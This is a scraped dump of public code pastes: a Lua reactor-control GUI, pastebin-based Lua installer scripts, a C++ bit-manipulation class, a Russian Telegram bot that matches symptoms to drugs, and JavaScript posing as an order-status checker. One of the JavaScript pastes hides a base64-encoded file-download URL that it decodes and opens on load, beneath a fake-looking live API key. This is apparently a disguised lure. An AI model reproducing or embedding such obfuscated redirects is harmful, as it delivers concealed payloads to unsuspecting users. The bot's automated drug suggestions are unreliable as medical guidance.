		oldUseRate = fuelUseRate or math.max(info.fuelConversionRate*20, 0.1)
		fuelUseRate = math.max(info.fuelConversionRate*20, 0.1)
		fuelAccel = math.max(fuelUseRate - oldUseRate, 0.1)
 -- Fuel Conversion Rate
	if info.fuelConversionRate > 249999 then
		fuelConversionRate = ((info.fuelConversionRate / (info.maxFuelConversion * 1000000)) * 2000)
		fuelMeasure = ""  %%/s""
	elseif info.fuelConversionRate > 999 then
		fuelConversionRate = (info.fuelConversionRate / 1000)
		fuelMeasure = "" ""..(unicode.char(956))..""b/t""
	elseif info.fuelConversionRate > 999999 then
		fuelConversionRate = (info.fuelConversionRate / 1000000)
		fuelMeasure = "" mb/t""
	else
		fuelConversionRate = info.fuelConversionRate
		fuelMeasure = "" nb/t""
	end
 -- Get Time Until Cool
	if info.fuelConversionRate < 1 then
		tempDrain = ((info.temperature - 2000) / 0.4)
	else
		tempDrain = 1
	end
 -- Get Temp Rise
	
	
 --Burn Stage
	if ((1 - info.fuelConversion / info.maxFuelConversion) * 100) > 20 then burnStage = ""H""
	elseif ((1 - info.fuelConversion / info.maxFuelConversion) * 100) > 15 then burnStage = ""He""
	elseif ((1 - info.fuelConversion / info.maxFuelConversion) * 100) > 10 then burnStage = ""C""
	elseif ((1 - info.fuelConversion / info.maxFuelConversion) * 100) > 8 then burnStage = ""Ne""
	elseif ((1 - info.fuelConversion / info.maxFuelConversion) * 100) > 5.5 then burnStage = ""O""
	elseif ((1 - info.fuelConversion / info.maxFuelConversion) * 100) > 2.5 then burnStage = ""Si""
	elseif ((1 - info.fuelConversion / info.maxFuelConversion) * 100) > 1 then burnStage = ""Fe""
	end
 -- Accuracy
	if ((info.fieldStrength / info.maxFieldStrength) * 100) > idealField then
	 deviation = (((info.fieldStrength / info.maxFieldStrength) * 100) + fieldAdj) - idealField
	elseif ((info.fieldStrength / info.maxFieldStrength) * 100) < idealField then
	 deviation = idealField - (((info.fieldStrength / info.maxFieldStrength) * 100) + fieldAdj)
	end
 -- DrawData
	local secondsToExpire = (info.maxFuelConversion - info.fuelConversion) / math.max(info.fuelConversionRate*0.00002, 0.00001)
 -- GUI
	if term.isAvailable() and Mode ~= 3 then
		function modify_eff(offset)
			local eff = ((outputFlux / inputFlux) * 100)
			if eff > 100000 then
			eff = 1
		end
	end
    local left_margin = 2
    local spacing = 1
    local values = {
			    ""Draconic Control™  [v15.0 sMPD | DMskdXS2]"",
                "" "",
                ""┌──────────────────Reactor Statistics────────────────────┐"",
string.format(""│Time Until Refuel:         │  %5.0fd, %2.0fh, %2.0fm, %2.0fs     │"", secondsToExpire/86400, secondsToExpire	/3600 % 24, secondsToExpire/60 % 60, secondsToExpire % 60),
string.format(""│Time Until Cool:           │  %5.0fd, %2.0fh, %2.0fm, %2.0fs     │"", tempDrain/86400, tempDrain	/3600 % 24, tempDrain/60 % 60, tempDrain % 60),
string.format(""│Ideal Field:               │           %8.3f%%        │"", idealField),
string.format(""│Current Field:             │           %7.3f%%         │"", ((info.fieldStrength / info.maxFieldStrength) * 100) + fieldAdj),
                ""├───────────────────────────┼────────────────────────────┤"",
string.format(""│Fuel Remaining:            │           %7.3f%%         │"", ((1 - info.fuelConversion / info.maxFuelConversion) * 100)),
string.format(""│Fuel Use Rate:             │           %7.3f"" .. fuelMeasure .. ""     │"", fuelConversionRate),
                ""├───────────────────────────┼────────────────────────────┤"",
string.format(""│Temperature                │   %7.1f°c [%8.1f°f]   │"", info.temperature, ((info.temperature * 1.8) + 32)),
string.format(""│Ideal Temperature:         │   %7.1f°c [%8.1f°f]   │"", idealTemp, ((idealTemp * 1.8) + 32)),
                ""├───────────────────────────┼────────────────────────────┤"",
string.format(""│Energy Input:              │   %12.1f RF/t        │"", requiredInput),
string.format(""│Energy Output:             │   %12.1f RF/t        │"", outputFlux.getFlow()),
                ""└───────────────────────────┴────────────────────────────┘"",
                "" "" .. cVar,
                "" ""
}
	local values2 = {
"" "",
"" "",
"" "",
""                                                                                                                          [Reference Table]"",
""                                                                                                             ┌─────────────┬─────────────┬─────────────┐"",
""                                                                                                             │ Temperature │  Remaining  │ Consumption │"",
""                                                                                                             ├─────────────┼─────────────┼─────────────┤"",
""                                                                                                             │    14000    │    93.27    │    91.90    │"",
""                                                                                                             ├─────────────┼─────────────┼─────────────┤"",
""                                                                                                             │    15000    │    59.00    │    123.5    │"",
""                                                                                                             ├─────────────┼─────────────┼─────────────┤"",
""                                                                                                             │    16000    │    36.45    │     161     │"",
""                                                                                                             ├─────────────┼─────────────┼─────────────┤"",
""                                                                                                             │    17000    │    21.40    │     204     │"",
""                                                                                                             ├─────────────┼─────────────┼─────────────┤"",
""                                                                                                             │    18000    │    11.80    │     251     │"",
""                                                                                                             ├─────────────┼─────────────┼─────────────┤"",
""                                                                                                             │    19000    │    03.89    │     303     │"",
""                                                                                                             └─────────────┴─────────────┴─────────────┘"",
"" "",
"" "",
"" "",
"" "",
"" "",
"" "",
"" "",
"" "",
"" "",
"" "",
"" "",
"" "",
"" "",
			  ""Eq. Fusion Stage     "" .. burnStage,
string.format(""Max Fuel [nb]:       %4.3f"", (info.maxFuelConversion * 1000000)),
string.format(""Fuel Remaining [nb]: %4.3f"", ((info.maxFuelConversion - info.fuelConversion) * 1000000)),
string.format(""Temperature Rise: %4.3f"", tempAccel),
string.format(""Temp Resist for target temp %g (%g): %.2f"", idealTemp, targetTemp50, targetTempResist),
string.format(""Temp expo for convLVL %.2f: %.2f"", convLVL, targetTempExpo),
string.format(""Saturation needed for zero rise: %g (%3.2f%%)"", targetSat, targetCoreSat*100),
string.format(""Error between current saturation and target saturation: %g\n"", saturationError),
string.format(""Current field drain is %g RF/t"", info.fieldDrainRate),
string.format(""Current temp drain factor for temp %g is %1.2f"", info.temperature, tempDrainFactor),
string.format(""fieldNegPercent is %g"", fieldNegPercent),
string.format(""Required input to counter field drain: %g RF/t\n"", requiredInput),
string.format(""Field Deviation: "" .. unicode.char(8776) .. deviation .. ""%%""),
string.format(""Field #:       %9.3f"", info.fieldStrength),
string.format(""Field Per:     %9.3f"", ((info.fieldStrength / info.maxFieldStrength) * 100)),
string.format(""Input Flux Gate:  ["" .. inputFlux.address .. ""] Set To: "" .. inputFlux.getFlow()),
string.format(""Output Flux Gate: ["" .. outputFlux.address .. ""] Set To: "" .. outputFlux.getFlow())
}
term.clear()
    if Mode == 2 and Mode ~= 3 then
	for i, v in ipairs(values2) do
		term.setCursor(left_margin, i * spacing)
		term.write(v)
		end
	end
	if Mode ~= 3 then
	for i, v in ipairs(values) do
		term.setCursor(left_margin, i * spacing)
		term.write(v)
		end
	end
 -- Draw Buttons
 
		term.setCursor(tempOffsetX, tempOffsetY+10)
		term.write(""Reactor Temperature"")
		term.setCursor(fieldOffsetX+1, fieldOffsetY+10)
		term.write(""  Field Strength"")
		gpu.setForeground(0xFFFFFF)
	for bname, button in pairs(buttons) do
		gpu.setForeground(0x000000)
		if button.depressed then
			button.depressed = button.depressed - 1
			if button.depressed == 0 then
				button.depressed = nil
			end
		end
	if button.condition == nil or button.condition() then
		local centerColor = 0xBBBBBB
		local highlightColor = 0xCCCCCC
		local lowlightColor = 0x808080
	if button.depressed then
		centerColor = 0xAAAAAA
		highlightColor = 0x707070
		lowlightColor = 0xBBBBBB
	end
		gpu.setBackground(centerColor)
        gpu.fill(button.x, button.y, button.width, button.height, "" "")
	if button.width > 1 and button.height > 1 then
		gpu.setBackground(lowlightColor)
		gpu.fill(button.x+1, button.y+button.height-1, button.width-1, 1, "" "")
		gpu.fill(button.x+button.width-1, button.y, 1, button.height, "" "")
		gpu.setBackground(highlightColor)
		gpu.fill(button.x, button.y, 1, button.height, "" "")
		gpu.fill(button.x, button.y, button.width, 1, "" "")
	end
        gpu.setBackground(centerColor)
	if button.textcolor then gpu.setForeground(button.textcolor) end
        term.setCursor(button.x + math.floor(button.width / 2 - #button.text / 2), button.y + math.floor(button.height / 2))
        term.write(button.text)
	end
    end
    gpu.setBackground(0x676767)
    gpu.setForeground(0x220000)
	end
	if term.isAvailable() and Mode == 3 then
	local left_margin = 2
    local spacing = 1
	local values3 = {
""Eq. Fusion Stage     "" .. burnStage,
string.format(""Max Fuel [nb]:       %4.3f"", (info.maxFuelConversion * 1000000)),
string.format(""Fuel Remaining [nb]: %4.3f"", ((info.maxFuelConversion - info.fuelConversion) * 1000000)),
string.format(""Temperature Rise: %4.3f"", tempAccel),
string.format(""Temp Resist for target temp %g (%g): %.2f"", idealTemp, targetTemp50, targetTempResist),
string.format(""Temp expo for convLVL %.2f: %.2f"", convLVL, targetTempExpo),
string.format(""Saturation needed for zero rise: %g (%3.2f%%)"", targetSat, targetCoreSat*100),
string.format(""Error between current saturation and target saturation: %g\n"", saturationError),
string.format(""Current field drain is %g RF/t"", info.fieldDrainRate),
string.format(""Current temp drain factor for temp %g is %1.2f"", info.temperature, tempDrainFactor),
string.format(""fieldNegPercent is %g"", fieldNegPercent),
string.format(""Required input to counter field drain: %g RF/t\n"", requiredInput),
string.format(""Field Deviation: "" .. unicode.char(8776) .. deviation .. ""%%""),
string.format(""Input Flux Gate:  ["" .. inputFlux.address .. ""] Set To: "" .. inputFlux.getFlow()),
string.format(""Output Flux Gate: ["" .. outputFlux.address .. ""] Set To: "" .. outputFlux.getFlow())
}
 for i, v in ipairs(values3) do
 term.setCursor(left_margin, i * spacing)
 term.write(v)
 end
end
 -- Wait for next tick, or manual shutdown
	local event, id, op1, op2 = event.pull(0.01)
	if event == ""interrupted"" then
		if safe then
		break
		end
	elseif event == ""touch"" then
 -- Handle Button Presses
		local x = op1
		local y = op2
		for bname, button in pairs(buttons) do
			if (button.condition == nil or button.condition()) and x >= button.x and x <= button.x + button.width and y >= button.y and y <= button.y + button.height then
				button.action()
				button.depressed = 3
			end
		end
	end
		if info.fuelConversionRate == 0 and chaosMode == 1 then
		reactor.stopReactor()
		cutoffTemp = 9001
		idealTemp = 8000
		chaosMode = 0
    end
end
:: fin ::"
3AZ28XdU,Untitled,Overcontrol1,Lua,Friday 4th of April 2025 10:45:45 AM CDT,"local files_to_grab_JSON = '{""aUNLYEkT"":""0.composite""}';
local files_to_grab = textutils.unserialiseJSON(files_to_grab_JSON);

local install_directory = """"

local new_file_identifier = ""--ccpm_filename ""

local files_waiting = {};

local function fetchFile(pastebinID, filename)
    if fs.exists(filename) then
        fs.delete(filename);
    end

    return shell.run(""pastebin"", ""get "" .. pastebinID .. "" "" .. filename);
end

for pastebinID, filename in pairs(files_to_grab) do
    local success = fetchFile(pastebinID, filename);

    if success then
        table.insert(files_waiting, filename);
    end
end

local unconsumed_files = {};

local function consumeCompositeFile(fileHandle)
    local currentLine = fileHandle.readLine();
    local currentHandle = nil;

    while currentLine ~= nil do
        if string.find(currentLine, new_file_identifier) then
            -- new file, consume old one
            if currentHandle ~= nil then
                currentHandle.close();
            end

            local filename = string.sub(currentLine, #new_file_identifier + 1);
            currentHandle = fs.open(install_directory..""/""..filename, ""w"");
        elseif currentHandle ~= nil then
            currentHandle.writeLine(currentLine)
        end
        currentLine = fileHandle.readLine();
    end

    if currentHandle ~= nil then
        currentHandle.close();
    end
end

local function consumeFiles()
    while #files_waiting > 0 do
        for index, filename in ipairs(files_waiting) do
            if fs.exists(filename) then
                table.remove(files_waiting, index);
                table.insert(unconsumed_files, filename);
            end
        end

        for index, temp_filename in ipairs(unconsumed_files) do
            local temp_file = fs.open(temp_filename, ""r"");
            consumeCompositeFile(temp_file)
            temp_file.close();
            fs.delete(temp_filename);
        end
    end
end

consumeFiles();"
aUNLYEkT,Untitled,Overcontrol1,Lua,Friday 4th of April 2025 10:45:44 AM CDT,"--ccpm_filename  index.lua
local module = require(""folder.module"")

print(module.skib);
--ccpm_filename  folder/module.lua
local module = {}

module.skib = ""Skibidi""

return module;"
ytedhCKF,Untitled,Overcontrol1,Lua,Friday 4th of April 2025 10:35:43 AM CDT,"local files_to_grab_JSON = '{""uuQUwFRp"":""0.composite""}';
local files_to_grab = textutils.unserialiseJSON(files_to_grab_JSON);
local install_directory = ""cargo""

local new_file_identifier = ""--ccpm_filename ""

local files_waiting = {};

local function fetchFile(pastebinID, filename)
    if fs.exists(filename) then
        fs.delete(filename);
    end

    return shell.run(""pastebin"", ""get "" .. pastebinID .. "" "" .. filename);
end

for pastebinID, filename in pairs(files_to_grab) do
    local success = fetchFile(pastebinID, filename);

    if success then
        table.insert(files_waiting, filename);
    end
end

local unconsumed_files = {};

local function consumeCompositeFile(fileHandle)
    local currentLine = fileHandle.readLine();
    local currentHandle = nil;

    while currentLine ~= nil do
        if string.find(currentLine, new_file_identifier) then
            -- new file, consume old one
            if currentHandle ~= nil then
                currentHandle.close();
            end

            local filename = string.sub(currentLine, #new_file_identifier + 1);
            currentHandle = fs.open(install_directory..""/""..filename, ""w"");
        elseif currentHandle ~= nil then
            currentHandle.writeLine(currentLine)
        end
        currentLine = fileHandle.readLine();
    end

    if currentHandle ~= nil then
        currentHandle.close();
    end
end

local function consumeFiles()
    while #files_waiting > 0 do
        for index, filename in ipairs(files_waiting) do
            if fs.exists(filename) then
                table.remove(files_waiting, index);
                table.insert(unconsumed_files, filename);
            end
        end

        for index, temp_filename in ipairs(unconsumed_files) do
            local temp_file = fs.open(temp_filename, ""r"");
            consumeCompositeFile(temp_file)
            temp_file.close();
            fs.delete(temp_filename);
        end
    end
end

consumeFiles();"
uuQUwFRp,Untitled,Overcontrol1,Lua,Friday 4th of April 2025 10:35:42 AM CDT,"--ccpm_filename index.lua
local module = require(""folder.module"")

print(module.skib);
--ccpm_filename folder/module.lua
local module = {}

module.skib = ""Skibidi"";

return module;"
0ayYvvU1,bits.cpp,orborbson,C++,Friday 4th of April 2025 10:35:20 AM CDT,"#include <cstdio>
#include <cstdint>

template <typename T = uint16_t> // szablon, domyślnie uint16_t
class bitx {
	private:
		volatile T _reg;
		uint16_t _size;
	public:
		bitx(T reg) : _reg(reg), _size(sizeof(T) << 3) {}
		bitx() : bitx(0) {}
		
		bitx & operator = (T reg) noexcept {
			_reg = reg;
			return *this;
		}
		
		operator T() const noexcept { 
			return _reg;
		}
		
		// błąd (-1), sukces (0 lub 1)
		int bit_get(uint16_t pos) const { 
			return (pos < _size ? ((_reg >> pos) & 0x1) : -1);
		}
		
		// błąd (false), sukces (true) 
		bool bit_set(uint16_t pos, bool stat) {
			return (pos < _size) ? (stat ? (_reg |= (1 << pos)) : (_reg &= ~(1 << pos)), true) : false;
		}
		
		uint16_t bit_length() const noexcept {
			return _size;
		}
};

int main(){
	bitx<> reg = 0xABCD;
	
	printf(""liczba bitów: %i\n"", reg.bit_length());
	printf(""rejestr przed zmianą: %4X, bit0: %i\n"", (uint16_t)reg, reg.bit_get(0));
	reg.bit_set(0, 0); // ustawiam bit0 na 0
	reg.bit_set(10, 1); // ustawiam bit10 na 1
	if(reg.bit_set(20, 0)) printf("">> błąd, przekroczony zakres\n""); // specjalnie przekraczam zakres
	printf(""rejestr po zmianie: %4X, bit0: %i\n"", (uint16_t)reg, reg.bit_get(0));
	
	return 0;
}
"
DLXEhQwh,TgBotMedical,Hasli4,Python,Friday 4th of April 2025 10:25:17 AM CDT,"# -*- coding: utf-8 -*-
""""""
Полноценная реализация чат-бота для Telegram.
Бот обрабатывает входящие сообщения следующим образом:
1. Получает сообщение от пользователя.
2. С помощью NLTK:
   - Токенизирует текст,
   - Удаляет стоп-слова,
   - Оставляет только слова (без знаков препинания и чисел).
3. Приводит слова к нормальной форме (лемматизация) с помощью spaCy.
4. Дополнительно для симптомов пытается преобразовать глагол в существительное (например, ""тошнить"" -> ""тошнота"") с помощью pymorphy2.
5. Загружает таблицу ""Лекарства.xlsx"" с данными
   (столбцы: раздел, подраздел, наименование, Фармакологическое действие, Показания к применению, Побочные эффекты).
6. Производится поиск по всем столбцам.
7. Если по столбцу ""наименование"" находятся совпадения, бот выводит красиво отформатированную справку с эмодзи.
8. Если препарата не найдено, но совпадения обнаружены в столбцах ""Показания к применению"" или ""Побочных эффектов"",
   выводится сообщение с рекомендациями.
9. Если совпадений нет – выводится сообщение ""Информация по запросу не найдена.""
10. Бот также обрабатывает команды /start, /help и ""Выход"" для завершения работы.
""""""

import os
import re
import telebot
import pandas as pd
import nltk
from nltk.tokenize import word_tokenize
from nltk.corpus import stopwords
import spacy
import pymorphy2

# Загружаем необходимые ресурсы NLTK
nltk.download('punkt')
nltk.download('stopwords')

# Загружаем spaCy модель для русского языка
nlp = spacy.load(""ru_core_news_md"")

# Инициализируем pymorphy2 для морфологического анализа
morph = pymorphy2.MorphAnalyzer()

# Загружаем Excel-файл с лекарствами.
try:
    df = pd.read_excel(""Лекарства.xlsx"")
except Exception as e:
    print(""Ошибка при загрузке файла Excel:"", e)
    df = None

# Получаем токен из переменной окружения
TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
if TOKEN is None:
    raise ValueError(""Переменная окружения TELEGRAM_BOT_TOKEN не установлена!"")

bot = telebot.TeleBot(TOKEN)


def process_message(text):
    """"""
    Обрабатывает входящий текст:
      - Приводит к нижнему регистру.
      - Токенизирует, удаляет стоп-слова, оставляя только буквы.
      - Лемматизирует текст с помощью spaCy.
      - Для каждого токена, если он является глаголом, пытается найти производную существительную форму.
      - Применяет обработку синонимов (например, ""насморк"" -> ""ринит"")
      - Обрабатывает симптомы: заменяет ""болеть"" на ""боль"".
      - Если встречаются и ""боль"" и локализационные слова (например, ""живот"", ""рука"", ""кости""),
        локализационные токены сохраняются отдельно и удаляются из итогового списка для поиска.
    Возвращает кортеж: (список лемм для поиска, список найденных локаций).

    Изменения: строки примерно 40-70.
    """"""
    text = text.lower()
    tokens = word_tokenize(text, language=""russian"")
    # Фильтруем: оставляем только буквы, исключаем стоп-слова и токены длиной меньше 3 символов
    filtered_tokens = [token for token in tokens
                       if token.isalpha() and token not in stopwords.words(""russian"") and len(token) > 2]
    doc = nlp("" "".join(filtered_tokens))
    lemmas = []
    for token in doc:
        lemma = token.lemma_
        # Преобразование глаголов в существительные (например, ""тошнить"" -> ""тошнота"", ""рвать"" -> ""рвота"")
        p = morph.parse(lemma)[0]
        if 'VERB' in p.tag and lemma in ['тошнить', 'рвать']:
            mapping = {'тошнить': 'тошнота', 'рвать': 'рвота'}
            lemma = mapping.get(lemma, lemma)
        # Обработка просторечных выражений (например, ""насморк"" -> ""ринит"")
        colloquial_mapping = {
            'насморк': 'ринит'
        }
        if lemma in colloquial_mapping:
            lemma = colloquial_mapping[lemma]
        # Обработка симптомов: замена ""болеть"" на ""боль""
        symptom_mapping = {
            'болеть': 'боль'
        }
        if lemma in symptom_mapping:
            lemma = symptom_mapping[lemma]
        lemmas.append(lemma)
    # Определяем локализационные ключевые слова
    location_candidates = ['живот', 'рука', 'кости']
    locations_found = [token for token in lemmas if token in location_candidates]
    # Если встречаются и ""боль"" и локализация, удаляем локализационные токены из списка для поиска
    if ""боль"" in lemmas and locations_found:
        for loc in locations_found:
            while loc in lemmas:
                lemmas.remove(loc)
    return lemmas, locations_found


def search_tokens_in_table(tokens, dataframe):
    """"""
    Ищет совпадения для каждого токена по всем столбцам.
    Возвращает два словаря:
      col_matches: {имя_столбца: количество совпадений}
      col_matches_rows: {имя_столбца: список индексов строк, где найдены совпадения}
    """"""
    col_matches = {col: 0 for col in dataframe.columns}
    col_matches_rows = {col: [] for col in dataframe.columns}
    for token in tokens:
        # Создаем шаблон для точного совпадения по слову с учетом границ слова
        pattern = re.compile(r'\b' + re.escape(token) + r'\b')
        for col in dataframe.columns:
            for idx, value in dataframe[col].items():
                if pd.notnull(value) and pattern.search(str(value).lower()):
                    col_matches[col] += 1
                    col_matches_rows[col].append(idx)
    return col_matches, col_matches_rows


def analyze_results_all(col_matches_rows, dataframe, original_query, locations_found):
    """"""
    Анализирует результаты поиска.

    Сценарий 1: Если по столбцу ""наименование"" найдены совпадения, формирует отформатированную справку:
       💊 *Название:* <наименование>
          📁 *Раздел:* <раздел>
          📂 *Подраздел:* <подраздел>
          🔹 *Фармакологическое действие:* <...>
          🔹 *Показания к применению:* <...>
          🔹 *Побочные эффекты:* <...>

    Сценарий 2: Если препарата не найдено, но есть совпадения в ""Показаниях к применению"" или ""Побочных эффектах"",
    формируется сообщение вида:
       ""Возможно, у вас наблюдаются симптомы: <original_query>
        ⚠️ Это может быть побочным эффектом препарата: <перечень препаратов>
        💉 При таких симптомах показания по лечению: <перечень препаратов>""

    Если совпадений нет, возвращается сообщение ""Информация по запросу не найдена.""

    Дополнительно, если обнаружены локализации, связанные с травматологией (например, ""рука"" или ""кости""),
    к сообщению добавляется рекомендация обратиться к травматологу.

    Изменения: строка примерно 110.
    """"""
    # Сценарий 1: Поиск по ""наименование""
    if col_matches_rows.get(""наименование"") and len(col_matches_rows[""наименование""]) > 0:
        matched_indices = set(col_matches_rows[""наименование""])
        result_lines = []
        for idx in matched_indices:
            row = dataframe.loc[idx]
            med_name = row.get(""наименование"", ""Без наименования"")
            section = row.get(""раздел"", ""нет данных"")
            subsection = row.get(""подраздел"", ""нет данных"")
            pharm_action = row.get(""Фармакологическое действие"", ""нет данных"")
            indications = row.get(""Показания к применению"", ""нет данных"")
            side_effects = row.get(""Побочные эффекты"", ""нет данных"")
            line = (f""💊 *Название:* {med_name}\n""
                    f""   📁 *Раздел:* {section}\n""
                    f""   📂 *Подраздел:* {subsection}\n""
                    f""   🔹 *Фармакологическое действие:* {pharm_action}\n""
                    f""   🔹 *Показания к применению:* {indications}\n""
                    f""   🔹 *Побочные эффекты:* {side_effects}"")
            result_lines.append(line)
        message_text = ""Возможно, вы искали:\n\n"" + ""\n\n"".join(result_lines)
    else:
        # Сценарий 2: Поиск по симптомам в ""Показаниях к применению"" и ""Побочных эффектах""
        side_effects_indices = set(col_matches_rows.get(""Побочные эффекты"", []))
        indications_indices = set(col_matches_rows.get(""Показания к применению"", []))
        messages = []
        if side_effects_indices:
            meds_side = []
            for idx in side_effects_indices:
                row = dataframe.loc[idx]
                med_name = row.get(""наименование"", ""Неизвестно"")
                meds_side.append(med_name)
            meds_side = list(set(meds_side))
            messages.append(""⚠️ Это может быть побочным эффектом препарата: "" + "", "".join(meds_side))
        if indications_indices:
            meds_ind = []
            for idx in indications_indices:
                row = dataframe.loc[idx]
                med_name = row.get(""наименование"", ""Неизвестно"")
                meds_ind.append(med_name)
            meds_ind = list(set(meds_ind))
            messages.append(""💉 При таких симптомах показания по лечению: "" + "", "".join(meds_ind))
        if messages:
            message_text = (f""Возможно, у вас наблюдаются симптомы: *{original_query}*.\n"" +
                            ""\n"".join(messages))
        else:
            message_text = ""Информация по запросу не найдена.""
    # Если в найденных локациях обнаружены слова, связанные с травматологией, добавляем рекомендацию
    if any(loc in ['рука', 'кости'] for loc in locations_found):
        message_text += ""\n\nРекомендуем также обратиться к травматологу для уточнения диагноза.""
    return message_text


@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, 'Привет! Чем могу помочь? Напиши ""Выход"" для завершения работы.')


@bot.message_handler(content_types=['text'])
def get_text_messages(message):
    if message.text.strip().lower() == ""выход"":
        bot.send_message(message.from_user.id, ""Бот завершает работу. До свидания!"")
        exit_program()
        return
    original_query = message.text.strip()
    # Получаем леммы и найденные локации
    lemmas, locations_found = process_message(message.text)
    print(""Обработанные токены:"", lemmas, ""Найденные локации:"", locations_found)
    # Если запрос содержит ""боль"", но не указана локализация, просим уточнить
    if ""боль"" in lemmas and not locations_found:
        bot.send_message(message.from_user.id,
                         ""Пожалуйста, уточните локализацию боли (например, 'боль в животе' или 'боль в руке')."")
        return
    if df is None:
        bot.send_message(message.from_user.id, ""Ошибка: не удалось загрузить таблицу с данными."")
        return
    col_matches, col_matches_rows = search_tokens_in_table(lemmas, df)
    print(""Совпадения по столбцам:"", col_matches)
    result = analyze_results_all(col_matches_rows, df, original_query, locations_found)
    bot.send_message(message.from_user.id, result, parse_mode=""Markdown"")


def exit_program():
    print(""Завершение работы программы..."")
    bot.stop_polling()
    quit()


bot.polling(none_stop=True, interval=0)
"
XrWYF70z,Untitled,Overcontrol1,Lua,Friday 4th of April 2025 10:20:30 AM CDT,"local files_to_grab_JSON = '{""5UmWhZKn"":""0.composite""}';
local files_to_grab = textutils.unserialiseJSON(files_to_grab_JSON);
local install_directory = ""cargo""

local new_file_identifier = ""--ccpm_filename ""

local files_waiting = {};

local function fetchFile(pastebinID, filename)
    if fs.exists(filename) then
        fs.delete(filename);
    end

    shell.run(""pastebin"", ""get "" .. pastebinID .. "" "" .. filename);
end

for pastebinID, filename in pairs(files_to_grab) do
    fetchFile(pastebinID, filename);
    table.insert(files_waiting, filename);
end

local unconsumed_files = {};

local function consumeCompositeFile(fileHandle)
    local currentLine = fileHandle.readLine();
    local currentHandle = nil;

    while currentLine ~= nil do
        if string.find(currentLine, new_file_identifier) then
            -- new file, consume old one
            if currentHandle ~= nil then
                currentHandle.close();
            end

            local filename = string.sub(currentLine, #new_file_identifier + 1);
            currentHandle = fs.open(install_directory..""/""..filename, ""w"");
        elseif currentHandle ~= nil then
            currentHandle.writeLine(currentLine)
        end
        currentLine = fileHandle.readLine();
    end

    if currentHandle ~= nil then
        currentHandle.close();
    end
end

local function awaitFetching()
    while #files_waiting > 0 do
        for index, filename in ipairs(files_waiting) do
            if fs.exists(filename) then
                table.remove(files_waiting, index);
                table.insert(unconsumed_files, filename);
            end
        end

        for index, temp_filename in ipairs(unconsumed_files) do
            local temp_file = fs.open(temp_filename, ""r"");
            consumeCompositeFile(temp_file)
            temp_file.close();
            -- fs.delete(filename);
        end
    end
end

awaitFetching();"
NLun7qEL,Untitled,Overcontrol1,Lua,Friday 4th of April 2025 10:14:02 AM CDT,"local files_to_grab_JSON = '{""FWQXLG1M"":""0.composite""}';
local files_to_grab = textutils.unserialiseJSON(files_to_grab_JSON);
local install_directory = ""cargo""

local new_file_identifier = ""-- ccpm_filename ""

local files_waiting = {};

local function fetchFile(pastebinID, filename)
    if fs.exists(filename) then
        fs.delete(filename);
    end

    shell.run(""pastebin"", ""get "" .. pastebinID .. "" "" .. filename);
end

for pastebinID, filename in pairs(files_to_grab) do
    fetchFile(pastebinID, filename);
    table.insert(files_waiting, filename);
end

local unconsumed_files = {};

local function consumeCompositeFile(fileHandle)
    local currentLine = fileHandle.readLine();
    local currentHandle = nil;
    local currentFilename = nil;

    while currentLine ~= nil do
        if string.find(currentLine, new_file_identifier) then
            -- new file, consume old one
            if currentHandle ~= nil then
                currentHandle.close();
            end

            currentFilename = string.sub(currentLine, #new_file_identifier + 1);
            currentHandle = fs.open(install_directory..currentFilename, ""w"");
        elseif currentHandle ~= nil then
            currentHandle.writeLine(currentLine)
        end
    end

    if currentHandle ~= nil then
        currentHandle.close();
    end
end

local function awaitFetching()
    while #files_waiting > 0 do
        for index, filename in ipairs(files_waiting) do
            if fs.exists(filename) then
                table.remove(files_waiting, index);
                table.insert(unconsumed_files, filename);
            end
        end

        for index, filename in ipairs(unconsumed_files) do
            local handle = fs.open(filename, ""r"");
            consumeCompositeFile()
            handle.close();
            -- fs.delete(filename);
        end
    end
end

awaitFetching();"
LJwtCJaN,Untitled,WassupDog45,JavaScript,Friday 4th of April 2025 10:13:50 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/979/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
A5xpZ9fU,Untitled,Overcontrol1,Lua,Friday 4th of April 2025 10:10:20 AM CDT,"local files_to_grab_JSON = '{""Lu5bQC3E"":""0.composite""}';
local files_to_grab = textutils.unserialiseJSON(files_to_grab_JSON);
local installDirectory = ""cargo""

local files_waiting = {};

local function fetchFile(pastebinID, filename)
    filename = installDirectory .. ""/"" .. filename;
    table.insert(files_waiting, filename);

    if fs.exists(filename) then
        fs.delete(filename);
    end

    shell.run(""pastebin"", ""get "" .. pastebinID .. "" "" .. filename);
end

for key, value in pairs(files_to_grab) do
    fetchFile(key, value);
end
"
VNFHdkh4,Untitled,Overcontrol1,Lua,Friday 4th of April 2025 10:10:01 AM CDT,"local files_to_grab_JSON = '{""LqLgM6Y2"":""0.composite""}';
local files_to_grab = textutils.unserialiseJSON(files_to_grab_JSON);
local installDirectory = ""cargo""

local files_waiting = {};

local function fetchFile(pastebinID, filename)
    filename = installDirectory .. ""/"" .. filename;
    table.insert(files_waiting, filename);

    if fs.exists(filename) then
        fs.delete(filename);
    end

    shell.run(""pastebin"", ""get "" .. pastebinID .. "" "" .. filename);
end

for key, value in pairs(files_to_grab) do
    fetchFile(key, value);
end
"
4tqawfTn,Products.js,WassupDog45,JavaScript,Friday 4th of April 2025 09:58:21 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/031/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
